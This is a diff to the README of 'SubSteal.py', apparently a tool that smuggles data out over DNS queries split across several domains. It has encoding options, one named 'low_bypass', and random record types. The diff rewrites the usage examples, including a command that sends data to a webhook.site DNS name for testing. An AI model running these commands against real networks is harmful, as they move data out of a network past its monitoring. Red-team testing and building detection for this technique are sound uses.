@@ -34,25 +34,36 @@ Arguments:
 --mode          #Query mode (TXT, A, NS, RANDOM). Default is TXT.
 ```
 
-Example Usage:
+Example Usage: 
+
+
+
+if you want to divide the packages into more than one domain:
 ```
-python3 SubSteal.py --domains example.com example2.com --encryption xxd
-```
-```
-python3 SubSteal.py --domains example.com example2.com --encryption low_bypass
-```
-```
-python3 SubSteal.py --domains example.com --encryption xxd
+python3 SubSteal.py --domains example.com example2.com --encryption <Encryption_Method>
 ```
 ```
-python3 SubSteal.py --domains example.com --encryption xxd --mode RANDOM
+python3 SubSteal.py --domains example.com example2.com example3.com --encryption <Encryption_Method>
+```
+
+to work on a single domain:
+```
+python3 SubSteal.py --domains example.com --encryption <Encryption_Method>
+```
+to send the dns record you want:
+```
+python3 SubSteal.py --domains example.com --encryption <Encryption_Method> --mode <Query_Mode>
+```
+to send random dns records:
+```
+python3 SubSteal.py --domains example.com --encryption <Encryption_Method> --mode RANDOM
 ```
 Try on WebHook:
 1. Go [Webhook](https://webhook.site/)
 2. Copy "Your unique DNS name" Url
 3. Run the command:
  ```
-python3 --domains WebhookDomain --encryption xxd
+python3 SubSteal.py --domains <Webhook_Dns_Domain> --encryption xxd
 ```
 
 Client Side:
